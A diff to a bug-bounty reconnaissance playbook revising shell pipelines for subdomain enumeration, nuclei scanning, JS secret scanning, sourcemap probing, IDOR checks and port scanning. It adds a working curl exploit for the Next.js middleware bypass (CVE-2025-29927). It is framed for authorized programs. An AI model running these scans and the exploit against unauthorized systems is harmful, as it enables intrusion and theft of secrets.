@@ -60,16 +60,22 @@ which subfinder httpx dnsx nuclei katana waybackurls gau dalfox ffuf anew gf int
 TARGET="target.com"
 
 # Step 0: Passive — crt.sh certificate transparency (no API key needed)
-curl -s "https://crt.sh/?q=%.${TARGET}&output=json" \
-  | jq -r '.[].name_value' \
+# JSON often 502s/times out on large domains. Retry once, then HTML, then skip.
+curl -sS --max-time 30 "https://crt.sh/?q=%25.${TARGET}&output=json" \
+  | jq -r '.[].name_value' 2>/dev/null \
   | sed 's/\*\.//g' \
   | sort -u > /tmp/subs.txt
+if [ ! -s /tmp/subs.txt ]; then
+  curl -sS --max-time 30 "https://crt.sh/?q=%25.${TARGET}" \
+    | grep -oE '[a-zA-Z0-9._-]+\.'"${TARGET}" | sort -u > /tmp/subs.txt
+fi
 echo "[+] crt.sh: $(wc -l < /tmp/subs.txt) subdomains"
 
 # Step 1: Chaos API (ProjectDiscovery — most comprehensive source)
+# Chaos returns labels ("api", "1.dev"), not FQDNs. Append the parent domain.
 curl -s "https://dns.projectdiscovery.io/dns/$TARGET/subdomains" \
   -H "Authorization: $CHAOS_API_KEY" \
-  | jq -r '.[]' >> /tmp/subs.txt
+  | jq -r --arg d "$TARGET" '.subdomains[]? | select(. != "*" and . != "") | . + "." + $d' >> /tmp/subs.txt
 
 echo "[+] Chaos returned $(wc -l < /tmp/subs.txt) subdomains"
 
@@ -93,8 +99,9 @@ gau $TARGET --subs | anew /tmp/urls.txt
 
 echo "[+] Total URLs: $(wc -l < /tmp/urls.txt)"
 
-# Step 6: Nuclei scan
-nuclei -l /tmp/live.txt -t ~/nuclei-templates/ -severity critical,high,medium -o /tmp/nuclei.txt
+# Step 6: Nuclei scan — httpx -status-code -title lines are NOT a URL list.
+awk '{print $1}' /tmp/live.txt > /tmp/live-urls.txt
+nuclei -l /tmp/live-urls.txt -t ~/nuclei-templates/ -severity critical,high,medium -o /tmp/nuclei.txt
 ```
 
 ### Output to Organized Directory
@@ -160,8 +167,12 @@ source ~/tools/SecretFinder/.venv/bin/activate
 # Scan a single JS file
 python3 ~/tools/SecretFinder/SecretFinder.py -i "https://target.com/static/js/main.js" -o cli
 
-# Scan all JS URLs found in recon
-cat /tmp/urls.txt | grep "\.js$" | head -50 | while read url; do
+# Scan JS URLs found in recon. Auth/admin/api hosts first; do not drop the rest.
+cat /tmp/urls.txt | grep "\.js$" | awk '
+  /auth|admin|api|login|app|portal/ { print; next }
+  { rest[NR]=$0 }
+  END { for (i in rest) print rest[i] }
+' | while read url; do
   echo "=== $url ==="
   python3 ~/tools/SecretFinder/SecretFinder.py -i "$url" -o cli 2>/dev/null
 done
@@ -181,6 +192,12 @@ python3 ~/tools/LinkFinder/linkfinder.py -i "https://target.com/app.js" -o cli
 python3 ~/tools/LinkFinder/linkfinder.py -i "https://target.com" -d -o cli
 
 deactivate
+
+# Sibling sourcemaps — a 200 with "sourcesContent" is the original source. Record the URL; do not mirror the repo.
+cat /tmp/urls.txt | grep -E '\.js$' | sed 's/$/.map/' | while read url; do
+  code=$(curl -s -o /dev/null -w "%{http_code}" -m 8 "$url")
+  [ "$code" = "200" ] && echo "MAP $url"
+done
 ```
 
 ---
@@ -205,21 +222,21 @@ ffuf -u "https://target.com/api/FUZZ" \
      -ac \
      -t 20
 
-# IDOR fuzzing with authenticated request
-# Create req.txt with Authorization: Bearer TOKEN
+# IDOR: two ids you already have (yours and one other test account). Stop at the first foreign marker.
+# Do not walk seq 1..N. A 200 with your own object is not a finding.
 ffuf -request /tmp/req.txt \
      -request-proto https \
-     -w <(seq 1 10000) \
-     -fc 404 \
+     -w <(printf '%s\n' "$MY_ID" "$OTHER_ID") \
+     -mc 200 \
      -ac \
-     -t 10
+     -t 2
 ```
 
 ---
 
-## TARGET SCORING — GO / NO-GO
+## TARGET ORDER — when several authorized programs are in the queue
 
-Score before spending time. Skip if score < 4.
+An assigned in-scope target is hunted. The points only decide which authorized program to open first. A low score, a small bounty, a saturated hacktivity, or a marketing homepage is not a stop. Out-of-scope and an explicit program exclusion are the stops.
 
 | Criterion | Points |
 |---|---|
@@ -233,18 +250,7 @@ Score before spending time. Skip if score < 4.
 | Source code available | +1 |
 | Prior disclosed reports to study | +1 |
 
-**< 4:** Skip
-**4-5:** Only if nothing better available
-**6-8:** Good — spend 1-3 days
-**>= 9:** Excellent — spend up to 1 week
-
-### Pre-Dive Hard Kill Signals
-
-1. Max bounty < $500 → not worth your time
-2. All recent reports are N/A or duplicate → hunters saturated it
-3. Scope is only a static marketing page → no attack surface
-4. Company < 5 employees with no revenue → won't pay
-5. Explicitly excludes your planned bug class in rules
+Higher score → start here. Then finish the assigned target anyway: alt ports, JS, API specs, sibling TLDs, an account if registration is allowed.
 
 ---
 
@@ -279,9 +285,21 @@ curl -sI https://target.com | grep -iE "server|x-powered-by|x-aspnet|x-runtime|x
 | Express (Node.js) | Prototype pollution | Path traversal |
 | Spring Boot | Actuator (/actuator/heapdump, /env, /gateway/routes) | SpEL injection / SSTI (Thymeleaf) |
 | ASP.NET | ViewState deserialization (signed-only + machineKey) | Open redirect (ReturnUrl) |
-| Next.js | Middleware auth bypass (x-middleware-subrequest, CVE-2025-29927) | SSRF via Server Actions / image optimizer |
+| Next.js | Middleware auth bypass (CVE-2025-29927, below) | SSRF via Server Actions / image optimizer |
 | GraphQL | Introspection → auth bypass on mutations | IDOR via node(id:) |
 | WordPress | Plugin SQLi | REST API auth bypass |
+
+### Next.js middleware bypass (CVE-2025-29927) — one request
+
+Affected: 11.1.4–12.3.4, 13.0.0–13.5.8, 14.0.0–14.2.24, 15.0.0–15.2.2. Patched in 12.3.5, 13.5.9, 14.2.25, 15.2.3. Proof is a body-diff on a route that redirects or 401s without the header and returns a marker you should not see with it. The same body both times is not a bypass.
+
+```bash
+# 15.x before the patch: the value must exceed the recursion depth (5).
+# Older lines often accept a single "middleware" or "src/middleware".
+curl -sk -D- -o /tmp/nx-off.txt "https://$TARGET/admin"
+curl -sk -D- -o /tmp/nx-on.txt -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" "https://$TARGET/admin"
+# Also try src/middleware and pages/_middleware, each repeated five times. Diff the two bodies.
+```
 
 ---
 
@@ -299,7 +317,7 @@ KNOWN="/tmp/$TARGET-subs-known.txt"
 subfinder -d $TARGET -silent > /tmp/$TARGET-subs-fresh.txt
 curl -s "https://dns.projectdiscovery.io/dns/$TARGET/subdomains" \
   -H "Authorization: $CHAOS_API_KEY" \
-  | jq -r '.[]' >> /tmp/$TARGET-subs-fresh.txt
+  | jq -r --arg d "$TARGET" '.subdomains[]? | select(. != "*" and . != "") | . + "." + $d' >> /tmp/$TARGET-subs-fresh.txt
 
 # Diff against known
 NEW=$(comm -23 <(sort /tmp/$TARGET-subs-fresh.txt) <(sort $KNOWN 2>/dev/null))
@@ -310,6 +328,31 @@ if [ -n "$NEW" ]; then
 fi
 
 # Schedule: crontab -e → 0 8 * * * /bin/bash ~/monitors/subs-watch.sh
+```
+
+### JS bundle change watch (first-mover on redeploys)
+
+A new `main.<hash>.js` / `/_next/static/<buildId>/` is new endpoints and sometimes new secrets. Hash the live entry bundles daily; on change, hand the old+new bytes to `changed-js-deepdive` (`engine/jsdiff.py`). Do not re-crawl the whole app.
+
+```bash
+#!/bin/bash
+TARGET="target.com"
+STATE="/tmp/$TARGET-js-hashes.txt"
+curl -sL "https://$TARGET/" | grep -oE 'src="[^"]+\.js"' | sed 's/src="//;s/"//' | sort -u > /tmp/$TARGET-js-now.txt
+: > /tmp/$TARGET-js-new.txt
+while read src; do
+  case "$src" in http*) url="$src" ;; *) url="https://$TARGET/${src#/}" ;; esac
+  hash=$(curl -sL -m 15 "$url" | sha256sum | awk '{print $1}')
+  echo "$url $hash" >> /tmp/$TARGET-js-new.txt
+done < /tmp/$TARGET-js-now.txt
+if [ -f "$STATE" ]; then
+  comm -13 <(sort "$STATE") <(sort /tmp/$TARGET-js-new.txt) | while read url hash; do
+    echo "CHANGED JS: $url"
+    # python3 engine/jsdiff.py fetch --old "<previous>" --new "$url"  → changed-js-deepdive
+  done
+fi
+cp /tmp/$TARGET-js-new.txt "$STATE"
+# Schedule: 0 */6 * * * /bin/bash ~/monitors/js-watch.sh
 ```
 
 ### GitHub Commit Watch
@@ -340,7 +383,7 @@ fi
 ```bash
 # naabu — fast port scanner from ProjectDiscovery
 # Finds non-standard ports: 8080, 8443, 3000, 8888, 9000, etc.
-cat /tmp/live.txt | awk '{print $1}' | naabu -port 80,443,8080,8443,3000,4000,5000,8000,8888,9000,9090,9200,6379 -silent | tee /tmp/open-ports.txt
+cat /tmp/live.txt | awk '{print $1}' | naabu -port 80,443,8080,8443,3000,4000,5000,8000,8888,9000,9090,9200,6379,6443,10250,2375,27017 -silent | tee /tmp/open-ports.txt
 
 # Why this matters: admin panels, debug services, internal APIs often run on alt ports
 # Example wins: :8080/actuator/env (Spring Boot), :9200/_cat/indices (Elasticsearch), :6379 (Redis)
@@ -349,14 +392,12 @@ cat /tmp/live.txt | awk '{print $1}' | naabu -port 80,443,8080,8443,3000,4000,50
 ## SECRET SCANNING IN JS BUNDLES
 
 ```bash
-# trufflehog — high-signal secret detection with entropy analysis
-# Scans JS files and git repos
-pip install trufflehog3 2>/dev/null || true
-trufflehog filesystem --only-verified recon/$TARGET/ 2>/dev/null
+# trufflehog v3 (Go binary). Do not `pip install trufflehog3` — that is a different CLI.
+trufflehog filesystem --only-verified "recon/$TARGET/"
 
 # SecretFinder — manual JS bundle scan (already in tools/)
 source ~/tools/SecretFinder/.venv/bin/activate
-cat /tmp/urls.txt | grep "\.js$" | head -100 | while read url; do
+cat /tmp/urls.txt | grep "\.js$" | while read url; do
   python3 ~/tools/SecretFinder/SecretFinder.py -i "$url" -o cli 2>/dev/null
 done
 deactivate
@@ -574,10 +615,11 @@ API spec endpoints are the single highest-leverage recon target on any modern .N
 ### Integration with the standard pipeline
 
 ```bash
-# After live-hosts.txt is built (Phase 1 / 2), run:
-ffuf -w swagger-paths.txt -u "https://FUZZ.target.com" -mc 200,302 -fs 0 -t 50 -o swagger-hits.json
-# Or with httpx for content-aware filtering:
-httpx -l live-hosts.txt -path swagger-paths.txt -mc 200 -mr "swagger|openapi" -json | tee swagger-hits.jsonl
+# After live-urls.txt is built. FUZZ is the PATH, not the hostname.
+ffuf -w swagger-paths.txt -u "https://target.comFUZZ" -mc 200,302 -fs 0 -t 20 -o swagger-hits.json
+# wordlist entries already start with / (/swagger, /openapi.json). Do not prefix another slash.
+# Content-aware (preferred on many hosts):
+httpx -l /tmp/live-urls.txt -path swagger-paths.txt -mc 200 -mr "swagger|openapi" -json | tee swagger-hits.jsonl
 # For every hit:
 jq '.paths | keys' swagger.json > endpoints.txt
 jq '.components.schemas' swagger.json > schemas.json   # mass-assignment field candidates
